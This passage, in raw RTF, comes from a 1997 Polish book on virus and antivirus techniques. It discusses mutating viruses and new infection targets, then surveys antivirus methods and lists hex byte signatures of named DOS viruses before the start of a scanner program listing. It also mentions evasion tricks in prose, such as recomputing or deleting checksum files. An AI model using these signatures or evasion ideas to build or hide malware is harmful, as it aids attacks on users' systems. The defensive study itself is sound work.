by\uc1\u322\'b3 polimorfi-czny, znalezienie jego ko}{\f1\fs24\lang1045{\*\listtag0}d}{\f0\fs24\lang1045{\*\listtag0}u wewn\uc1\u261\'b9trz ofiary by\uc1\u322\'b3oby podw\'f3jnie utrudnione. Mimo \uc1\u380\'bfe ju\uc1\u380\'bf wielokrotnie podejmowano pr\'f3by napisania takiego wirusa, nieliczne istniej\uc1\u261\'b9ce egzemplarze s\uc1\u261\'b9 jeszcze bardzo prymitywne.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 10.3. Wirusy zmienne genetycznie (mutuj\uc1\u261\'b9ce sw\'f3j kod)}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W kilku artyku\uc1\u322\'b3ach dost\uc1\u281\'eapnych w sieci Internet ich autorzy rozwa\uc1\u380\'bfaj\uc1\u261\'b9 mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 stworzenia wirusa, kt\'f3ry w kolejnych zara\uc1\u380\'bfanych ofiarach wygl\uc1\u261\'b9da\uc1\u322\'b3by inaczej, jednak kolejne generacje nie by\uc1\u322\'b3yby tworzone przy u\uc1\u380\'bfyciu polimorficznego generatora zmiennych procedur szyfruj\uc1\u261\'b9cych, a zas}{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0}da tworzenia nowych mutacji w\uc1\u322\'b3asnego kodu polega\uc1\u322\'b3aby na manipulowaniu instrukcjami kodu maszynowego tak, aby zachowana zosta\uc1\u322\'b3a funkcjonalno\uc1\u347\'9c\uc1\u263\'e6 kodu, lecz kod ten sukcesywnie by si\uc1\u281\'ea zmienia\uc1\u322\'b3 (podobnie jak kod odporny na heurystyk\uc1\u281\'ea, jednak tutaj zabieg ten b}{\f1\fs24\lang1045{\*\listtag0}y}{\f0\fs24\lang1045{\*\listtag0}\uc1\u322\'b3by wykonywany dla ka\uc1\u380\'bfdej instrukcji). Mo\uc1\u380\'bfna by powiedzie\uc1\u263\'e6, i\uc1\u380\'bf wirus taki posiada\uc1\u322\'b3by swoist\uc1\u261\'b9 to\uc1\u380\'bfsamo\uc1\u347\'9c\uc1\u263\'e6, objawiaj\uc1\u261\'b9c\uc1\u261\'b9 si\uc1\u281\'ea tym, i\uc1\u380\'bf wiedzia\uc1\u322\'b3by, co ma robi\uc1\u263\'e6 i na bazie jakiego\uc1\u347\'9c generatora tworzy\uc1\u322\'b3by sw\uc1\u261\'b9 now\uc1\u261\'b9 kopi\uc1\u281\'ea, przemieszczaj\uc1\u261\'b9c odpowiednie fragmenty ko}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch du, sy}{\f0\fs24\lang1045{\*\listtag0}muluj\uc1\u261\'b9c jedn\uc1\u261\'b9 instrukcj\uc1\u281\'ea za pomoc\uc1\u261\'b9 kilku itp. Na razie jednak zadanie to przekracza chyba umiej\uc1\u281\'eatno\uc1\u347\'9cci nawet najlepszych tw\'f3rc\'f3w wirus\'f3w, cho\uc1\u263\'e6 niewykluczone, i\uc1\u380\'bf dzie\uc1\u322\'b3o takie wkr\'f3tce si\uc1\u281\'ea pojawi.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 10.4. Wirusy infekuj\uc1\u261\'b9ce nowe, nie infekowane dotychczas obiek}{\f1\fs24\b\lang1045{\*\listtag0}ty}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Jak udowodni\uc1\u322\'b3y makrowirusy plik\'f3w DOC czy XLS, ci\uc1\u261\'b9gle mo\uc1\u380\'bfna znale\uc1\u378\'9f\uc1\u263\'e6 jak\uc1\u261\'b9\uc1\u347\'9c now\uc1\u261\'b9 platform\uc1\u281\'ea, dot\uc1\u261\'b9d nie zaj\uc1\u281\'eat\uc1\u261\'b9 przez wirusy. Ze wzgl\uc1\u281\'eadu na zmierzch systemu DOS znawcy wirus\'f3w przewiduj\uc1\u261\'b9, i\uc1\u380\'bf za kolejny cel tw\'f3rcy wirus\'f3w obior\uc1\u261\'b9 sobie inne popularne systemy, zw\uc1\u322\'b3aszcza system Windows 95 oraz, w mniejszym stopniu, Unix (zw\uc1\u322\'b3aszcza Linux), OS/2 lub Windows NT. Ju\uc1\u380\'bf dzi\uc1\u347\'9c mo\uc1\u380\'bfna znale\uc1\u378\'9f\uc1\u263\'e6 okazy wirus\'f3w infekuj\uc1\u261\'b9cych np. system Windows 95, Linux, OS/2 i,}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch co ciekawe, s\uc1\u261\'b9 one napisane w... czystym asemblerze (nawet w przypad}{\f1\fs24\lang1045{\*\listtag0}ku Linuxa).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Popularno\uc1\u347\'9c\uc1\u263\'e6 \uc1\u347\'9crodowiska Windows 95 powoduje, i\uc1\u380\'bf za mo\uc1\u380\'bfliwe obiekty ataku mo\uc1\u380\'bfna uzna\uc1\u263\'e6 wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 plik\'f3w u\uc1\u380\'bfywanych przez ten system, kt\'f3re zawieraj\uc1\u261\'b9 jakie\uc1\u347\'9c przydatne wirusom struktury danych lub te\uc1\u380\'bf oferuj\uc1\u261\'b9 jaki\uc1\u347\'9c mo\uc1\u380\'bfliwy do wykorzystania mechanizm. S\uc1\u261\'b9 to g\uc1\u322\'b3\'f3wnie pliki z kodem np. DLL, VXD, MPD, PDR, DRV, 386 oraz pliki grup i skr\'f3t\'f3w: GRP i LNK, przy pomocy kt\'f3rych mo\uc1\u380\'bfna stworzy\uc1\u263\'e6 kolejne warianty wirus\'f3w towarzysz\uc1\u261\'b9cych. Ze wzgl\uc1\u281\'eadu na struktur\uc1\u281\'ea plik\'f3w przeznaczonych dla Windows 95 (pliki nowe EXE o }{\f1\fs24\lang1045{\*\listtag0}n}{\f0\fs24\lang1045{\*\listtag0}ag\uc1\u322\'b3\'f3wku}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PE) mo\uc1\u380\'bfliwe jest tak\uc1\u380\'bfe zastosowanie zmiennych procedur szyfruj\uc1\u261\'b9cych do lepszego ukrycia wirusa.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch ROZDZIA\uc1\u321\'a3 11}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 11.1. Skanery (ang. }{\f1\fs24\i\b\lang1045{\*\listtag0}scaners}{\f1\fs24\b\lang1045{\*\listtag0})}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Najstarszym rodzajem program\'f3w antywirusowych s\uc1\u261\'b9 skanery. Ich dzia\uc1\u322\'b3anie polega na wyszukiwaniu zadanej sekwencji bajt\'f3w w ci\uc1\u261\'b9gu danych.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W wi\uc1\u281\'eakszo\uc1\u347\'9cci wirus\'f3w daje si\uc1\u281\'ea znale\uc1\u378\'9f\uc1\u263\'e6 unikaln\uc1\u261\'b9 sekwencj\uc1\u281\'ea bajt\'f3w (tzw. sygnatur\uc1\u281\'ea), dzi\uc1\u281\'eaki kt\'f3rej mo\uc1\u380\'bfliwe jest odnalezienie wirusa w pami\uc1\u281\'eaci lub w zara\uc1\u380\'bfonej ofierze.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Skuteczno\uc1\u347\'9c\uc1\u263\'e6 skanera zale\uc1\u380\'bfy od tego, jak bardzo charakterystyczna jest dana sekwencja. Najlepiej, je\uc1\u380\'bfeli wirus zawiera w sobie jaki\uc1\u347\'9c niekonwencjonalny napis lub specyficzny ci\uc1\u261\'b9g bajt\'f3w (np. jak\uc1\u261\'b9\uc1\u347\'9c procedur\uc1\u281\'ea demonstracyjn\uc1\u261\'b9).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wraz z pojawieniem si\uc1\u281\'ea wirus\'f3w polimorficznych znaczenie skaner\'f3w troch\uc1\u281\'ea zmala\uc1\u322\'b3o, jednak nadal jest to najwa\uc1\u380\'bfniejsza metoda walki z wirusami. Nawet w przypadku wirus\'f3w polimorficznych u\uc1\u380\'bfywa si\uc1\u281\'ea skanera, cho\uc1\u263\'e6 dopiero w p\'f3\uc1\u378\'9fniejszej fazie wykrywania (np. po krokowym lub emulowanym przej\uc1\u347\'9cciu pocz\uc1\u261\'b9tku programu), co \uc1\u347\'9cwiadczy o uniwersalno\uc1\u347\'9cci tej metody.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 11.2. Monitory (ang. }{\f1\fs24\i\b\lang1045{\*\listtag0}behaviour blockers, interceptors, resident monitors}{\f1\fs24\b\lang1045{\*\listtag0})}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Monitor to program antywirusowy zainstalowany jako TSR lub sterownik SYS, kt\'f3ry poprzez monitorowanie odpowiednich funkcji DOS i BIOS pozwala na}{\f0\fs24\lang1045{\*\listtag0} wykrywanie wszystkich wykonywanych za pomoc\uc1\u261\'b9 tych funkcji odwo\uc1\u322\'b3a\uc1\u324\'f1 do dysk\'f3w. Wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 tego typu program\'f3w posiada tak\uc1\u380\'bfe mechanizmy pozwalaj\uc1\u261\'b9ce na sprawdzanie, czy wykonywany proces nie ingeruje w jakie\uc1\u347\'9c systemowe struktury danych, np. bloki MCB lub tabl}{\f1\fs24\lang1045{\*\listtag0}i}{\f0\fs24\lang1045{\*\listtag0}c\uc1\u281\'ea wektor\'f3w przerwa\uc1\u324\'f1. To, czy monitor b\uc1\u281\'eadzie dzia\uc1\u322\'b3a\uc1\u322\'b3 prawid\uc1\u322\'b3owo, zale\uc1\u380\'bfy cz\uc1\u281\'easto od momentu, w kt\'f3rym przej\uc1\u261\'b9\uc1\u322\'b3 on kontrol\uc1\u281\'ea nad systemem (przed czy po wirusie) oraz od tego, jak g\uc1\u322\'b3\uc1\u281\'eaboko wnika on w system operacyjny (kontrola funkcji wykorzystywanych przez wir}{\f1\fs24\lang1045{\*\listtag0}u}{\f0\fs24\lang1045{\*\listtag0}sy jest przeprowadzana na pocz\uc1\u261\'b9tku \uc1\u322\'b3a\uc1\u324\'f1cucha obs\uc1\u322\'b3ugi przerwa\uc1\u324\'f1 lub te\uc1\u380\'bf na jego ko\uc1\u324\'f1cach). Jak wida\uc1\u263\'e6, aby dotrzyma\uc1\u263\'e6 kroku tw\'f3rcom wirus\'f3w, autorzy program\'f3w antywirusowych musz\uc1\u261\'b9 korzysta\uc1\u263\'e6 z metod podobnych do tych, kt\'f3re stosuj\uc1\u261\'b9 tw\'f3rcy wirus\'f3w.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Najwi\uc1\u281\'eaksz\uc1\u261\'b9 wad\uc1\u261\'b9 monitor\'f3w jest to, i\uc1\u380\'bf powoduj\uc1\u261\'b9 one cz\uc1\u281\'easte fa\uc1\u322\'b3szywe alarmy (ang. false positives), przez co u\uc1\u380\'bfytkownik po kolejnym irytuj\uc1\u261\'b9cym potwierdzeniu jakiej\uc1\u347\'9c zwyk\uc1\u322\'b3ej operacji dyskowej staje si\uc1\u281\'ea mniej uwa\uc1\u380\'bfny, a czasami wr\uc1\u281\'eacz deinstaluje program antywirusowy z pami\uc1\u281\'eac}{\f1\fs24\lang1045{\*\listtag0}i.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 11.3. Szczepionki (ang. }{\f1\fs24\i\b\lang1045{\*\listtag0}disinfectors}{\f1\fs24\b\lang1045{\*\listtag0})}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Szczepionki s\uc1\u261\'b9 programami skierowanymi przeciwko konkretnym wirusom. Na podstawie posiadanego, z\uc1\u322\'b3apanego egzemplarza wirusa mo\uc1\u380\'bfna, po odpowiedniej analizie jego kodu, zdefiniowa\uc1\u263\'e6 sygnatury, na podstawie kt\'f3rych wykrywa si\uc1\u281\'ea kopie wirusa w zainfekowanych obiektach. Dok\uc1\u322\'b3adna analiza kodu wirusa najcz\uc1\u281\'ea\uc1\u347\'9cciej pozwala tak\uc1\u380\'bfe odnale\uc1\u378\'9f\uc1\u263\'e6 w nim oryginalne warto\uc1\u347\'9cci pewnych parametr\'f3w, kt\'f3re mog\uc1\u261\'b9 pos\uc1\u322\'b3u\uc1\u380\'bfy\uc1\u263\'e6 do wyleczenia sektor\'f3w lub plik\'f3w (np. dla plik\'f3w typu EXE jest to punkt wej\uc1\u347\'9ccia do oryginalnego programu, dla plik\'f3w COM - pocz\uc1\u261\'b9tkowe bajty programu). Wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 z istniej\uc1\u261\'b9cych szczepionek to rozbudowane programy z interfejsem, kt\'f3re potrafi\uc1\u261\'b9 wykry\uc1\u263\'e6 i usun\uc1\u261\'b9\uc1\u263\'e6 kilka tysi\uc1\u281\'eacy wirus\'f3w. Tylko w przypadkach nowych wirus\'f3w niekt\'f3re osoby,}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}zmuszone okoliczno\uc1\u347\'9cciami, same pisz\uc1\u261\'b9 szczepionk\uc1\u281\'ea skierowan\uc1\u261\'b9 przeciwko konkretnemu wirusowi, czego efektem z regu\uc1\u322\'b3y jest nie do ko\uc1\u324\'f1ca przetestowany, ale dzia\uc1\u322\'b3aj\uc1\u261\'b9cy program.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 11.4. Programy autoweryfikuj\uc1\u261\'b9ce}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Programy tego typu umo\uc1\u380\'bfliwiaj\uc1\u261\'b9 dodanie do wskazanego pliku kr\'f3tkiego programu, maj\uc1\u261\'b9cego na celu sprawdzenia przy ka\uc1\u380\'bfdym uruchomienie, czy dany program nie zosta\uc1\u322\'b3 w jaki\uc1\u347\'9c spos\'f3b zmieniony (co zwykle oznacza ingerencj\uc1\u281\'ea wirusa). Dodawany kod dopisuje si\uc1\u281\'ea do pliku wykorzystuj\uc1\u261\'b9c te same mechanizmy co wirusy.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Na}{\f0\fs24\lang1045{\*\listtag0}jcz\uc1\u281\'ea\uc1\u347\'9cciej programy tego rodzaju s\uc1\u261\'b9 nieodporne na technik\uc1\u281\'ea stealth i w systemie zainfekowanym przez wirusa u\uc1\u380\'bfywaj\uc1\u261\'b9cego tej sztuczki nie wyka\uc1\u380\'bf\uc1\u261\'b9 \uc1\u380\'bfadnej zmiany w pliku, mimo \uc1\u380\'bfe jest on zainfekowany.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 11.5. Programy zliczaj\uc1\u261\'b9ce sumy kontrolne (ang. }{\f1\fs24\i\b\lang1045{\*\listtag0}integrity checkers}{\f1\fs24\b\lang1045{\*\listtag0})}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Dzia\uc1\u322\'b3anie tego typu program\'f3w polega na obliczaniu odpowiednich sum kontrolnych dla zadanego pliku lub plik\'f3w oraz ewentualnie sektor\'f3w. Zliczane sumy kontrolne s\uc1\u261\'b9 najcz\uc1\u281\'ea\uc1\u347\'9cciej przechowywane w osobnych plikach, tworzonych po pierwszym uruchomieniu programu. Je\uc1\u380\'bfeli pliki te istnia\uc1\u322\'b3y ju\uc1\u380\'bf wcze\uc1\u347\'9cniej, program antywirusowy wykorzystuje dane w nich zawarte, aby por\'f3wna\uc1\u263\'e6 sum\uc1\u281\'ea obliczan\uc1\u261\'b9 na bie\uc1\u380\'bf\uc1\u261\'b9co z poprzednio zachowan\uc1\u261\'b9.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Suma kontrolna nie musi (a nawet nie powinna) by\uc1\u263\'e6 sum\uc1\u261\'b9 arytmetyczn\uc1\u261\'b9. Dzi\uc1\u281\'eaki znajomo\uc1\u347\'9cci algorytm\'f3w stosowanych przez pewne programy antywirusowe niekt\'f3re wirusy potrafi\uc1\u261\'b9 zarazi\uc1\u263\'e6 plik i obliczy\uc1\u263\'e6 dla niego now\uc1\u261\'b9 sum\uc1\u281\'ea kontroln\uc1\u261\'b9, kt\'f3r\uc1\u261\'b9 bez wi\uc1\u281\'eakszych problem\'f3w mo\uc1\u380\'bfna zast\uc1\u261\'b9pi\uc1\u263\'e6 pierwotn\uc1\u261\'b9, przechowywan\uc1\u261\'b9 w pliku.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Pi\uc1\u281\'eat\uc1\u261\'b9 Achillesow\uc1\u261\'b9 program\'f3w zliczaj\uc1\u261\'b9cych sumy kontrolne jest to, i\uc1\u380\'bf pliki przechowywuj\uc1\u261\'b9ce obliczone sumy nie s\uc1\u261\'b9 w \uc1\u380\'bfaden spos\'f3b chronione, dlatego wiele wirus\'f3w bezkarnie kasuje napotkane znane sobie pliki z sumami kontrolnymi.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch ROZDZIA\uc1\u321\'a3 12}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 12.1. Skaning}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Historycznie jest to najstarsza technika stosowana przez programy antywirusowe. Skaning polega na wyszukiwaniu w zainfekowanym obiekcie zadanej sekwencji bajt\'f3w (sygnatury wirusa).}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Poni\uc1\u380\'bfej przedstawiono kilka przyk\uc1\u322\'b3adowych sygnatur istniej\uc1\u261\'b9cych wirus\'f3w:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch B8 ED FE CD 21 A3 03 01 0E 8F 06 6F 01 BA   ; sygnatura wirusa Atomie 1.0 }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BE 30 01 8B 16 17 01 B9 35 01 2E 31 14 83   ; sygnatura wirusa Human Greed }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 8B FC 36 8B 2D 81 ED 03 01 44 44 1E 06 OE   ; sygnatura wirusa DOOM! }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5D 83 ED 03 E8 15 00 EB 27 90 E8 OF 00 B4   ; sygnatura wirusa Ethernity }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5D 81 ED 03 01 EB 1B 90 B8 24 35 CD 21      ; sygnatura wirusa OLG}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Jak wida\uc1\u263\'e6, tradycyjna sygnatura jest to ci\uc1\u261\'b9g bajt\'f3w o nieustalonej z g\'f3ry d\uc1\u322\'b3ugo\uc1\u347\'9cci, zapisanych heksalnie, kt\'f3re program antywirusowy konwertuje na rozumian\uc1\u261\'b9 przez siebie posta\uc1\u263\'e6 binarn\uc1\u261\'b9 (maszynow\uc1\u261\'b9) i dopiero taki \uc1\u322\'b3a\uc1\u324\'f1cuch poszukiwany jest w przeszukiwanym obiekcie. Z czasem poj\uc1\u281\'eacie sygnatury rozszerzono. Dzisiejsze skanery potrafi\uc1\u261\'b9 interpretowa\uc1\u263\'e6 r\'f3\uc1\u380\'bfne symbole oraz znaki globalne (ang. wildcards) np. ? czy *. Poni\uc1\u380\'bfej podano przyk\uc1\u322\'b3ady kilku pro}{\f1\fs24\lang1045{\*\listtag0}s}{\f0\fs24\lang1045{\*\listtag0}tych, nieznacznie rozszerzonych sygnatur u\uc1\u380\'bfywaj\uc1\u261\'b9cych znak\'f3w globalnych:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BB ?2 B9 10 01 81 37 ?2 81 77 02 ?2 83 C3 04 E2 F2 ; sygnatura wirusa FireFly }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch B9 CC 01 BB ?2 2E 81 07 ?2 83 C3 02         ; sygnatura wirusa K-CMOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1E 06 OE OE 1F 07 2E FE 06 ?2 2E A1         ; sygnatura wirusa Geodesic Propagation}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 33 CO 8E D8 BE ?2 FF 34 FF 74 02 C7 04      ; sygnatura wirusa 1984}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Poni\uc1\u380\'bfej zamieszczono listing programu, kt\'f3ry umo\uc1\u380\'bfliwia wyszukiwanie zadanego ci\uc1\u261\'b9gu bajt\'f3w w podanym jako parametr pliku. Zadany ci\uc1\u261\'b9g bajt\'f3w mo\uc1\u380\'bfe by\uc1\u263\'e6 podany Jako \uc1\u322\'b3a\uc1\u324\'f1cuch w apostrofach lub jako zapisane heksalnie dane (mo\uc1\u380\'bfliwa jest tak\uc1\u380\'bfe kombinacja podanych metod).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Czesc ksiazki : "Nowoczesne techniki wirusowe i antywirusowe"        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                       SKANER v1.0, Autor : Adam Blaszczyk 1997             ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;    Program sluzy do przeszukiwania plikow w celu znalezienia zadanego      ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;    lancucha bajtow (np. stalej sygnatury wirusa) podanego jako parametr    ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;    przy wywolaniu programu.                                                ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                            DANE TECHNICZNE                                 ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
